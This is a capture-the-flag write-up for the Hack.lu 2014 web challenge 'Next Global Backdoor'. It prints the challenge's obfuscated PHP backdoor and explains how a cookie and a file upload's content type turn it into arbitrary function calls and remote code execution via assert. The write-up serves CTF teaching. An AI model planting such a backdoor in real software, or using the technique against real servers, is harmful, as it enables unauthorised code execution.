# Hack.lu CTF 2014: Next Global Backdoor

**Category:** Web
**Points:** 150
**Author:** reiners
**Description:**

> J0nas is a simple man. He specializes in only one thing: Building the most beautiful back doors that you’ve ever seen. This gem was used in multiple saloons, letting only the most skilled c0wb0ys pass.
>
> <https://wildwildweb.fluxfingers.net:1425/index.php>
> [index.phps](index.phps)

## Write-up

Let’s reformat the PHP source first:

```php
$GLOBALS
=
$GLOBALS{next}
=
next($GLOBALS{'GLOBALS'})[
	$GLOBALS['next']['next']
	=
	//* DELME */ var_dump(__LINE__, current($GLOBALS)) ? next($GLOBALS) :
	next($GLOBALS)['GLOBALS']
][
	$next['GLOBALS']
	=
	//* DELME */ var_dump(__LINE__, current($GLOBALS[GLOBALS]['GLOBALS'])) ? next($GLOBALS[GLOBALS]['GLOBALS'])[ $next['next'] ] :
	next($GLOBALS[GLOBALS]['GLOBALS'])[
		$next['next']
	]
][
	$next['GLOBALS'] = next($next['GLOBALS'])
][
	//* DELME */ var_dump(__LINE__, $GLOBALS[next]) ? $GLOBALS[next]['next']( $GLOBALS['next']{'GLOBALS'}) :
	$GLOBALS[next]['next'](
		$GLOBALS['next']{'GLOBALS'}
	)
]
=
next(neXt(${'next'}['next']));
```

Basically, a whole bunch of array pointer fun. You can see that there is one “dynamic” function call. At first glance, it looks like we can execute an arbitrary function with an argument of our choice if we can control the contents of `$GLOBALS[next]['next']` and `$GLOBALS['next']{'GLOBALS'}`. However, there is more to it than that. :-)

[`next`](https://php.net/next) moves the internal array pointer by one spot, and [`$GLOBALS`](https://php.net/globals) is a built-in array of global variables. By default, it contains the so-called [superglobals](https://php.net/superglobals), i.e. `$_GET`, `$_POST`, `$_COOKIE`, `$_FILES` and `$_SERVER` (depending on [`variables_order`](https://php.net/variables_order)), and `$GLOBALS` itself.

Because I suck at debugging (I have never used [Xdebug](http://xdebug.org/)), I sprinkled in a few `/* DELME /* var_dump()` lines to see what the current entry in each step was. It was hard for me to parse by reading because of all the variable variables and `next`’ing, so I also added a `source` entry to the `GET`, `POST`, and cookie arrays.

At the very start, the `$GLOBALS` array pointer points to `$_GET`. The first call to `next()` points it to `$_POST`, but another call advances it to `$_COOKIE`. (I found this hard to parse by reading because of the right-to-left interpretation mixed with the code inside the array keys — hence the `var_dump`.)

It then reads the value for the `GLOBALS` key, i.e. `$_COOKIE['GLOBALS']`. This will be the the name of the function to call, and the name of the file input under consideration when doing another `next($GLOBALS)`. After that third `next()`, we are at the `$_FILES` array (i.e., `$GLOBALS['_FILES_]`). The `next()` call on the `$_FILES[$_COOKIE['GLOBALS']]` entry advances that file array’s pointer to the second key, which is the content type. That value is used as the argument to the function call.

TL;DR The function in `$_COOKIE['GLOBALS']` is called with `$_FILE[$_COOKIE['GLOBALS']]['type']` as its only argument.

So, in short: leave `$_GET` and `$_POST` empty, set a cookie called `GLOBALS` with the name of the PHP function to call, add a file whose input name is that function name, and whose content type is the argument. (And ignore all the times `next` is used as an array key, be it as a string or as an (undefined) constant.)

Note that because [`eval`](https://php.net/eval) is not a function but a language construct, you cannot use it as the function to call. Use [`assert`](https://php.net/assert) instead.

Finally, here is an [example request](request.txt) (note the DOS line endings) which allows you to specify a shell command to run as a query string parameter.

You might need to [download the StartSSL root certificate](https://www.startssl.com/certs/ca-bundle.pem) first:

```bash
$ wget https://www.startssl.com/certs/ca-bundle.pem
```

Then, perform the request like this:

```bash
$ socat openssl:wildwildweb.fluxfingers.net:1425,cafile=./ca-bundle.pem stdio < request.txt
```

Eventually we found the flag in `/flag.txt` on the server. The flag is `flag{backdoor_business_is_hard,_fella}`.

## Other write-ups and resources

* none yet
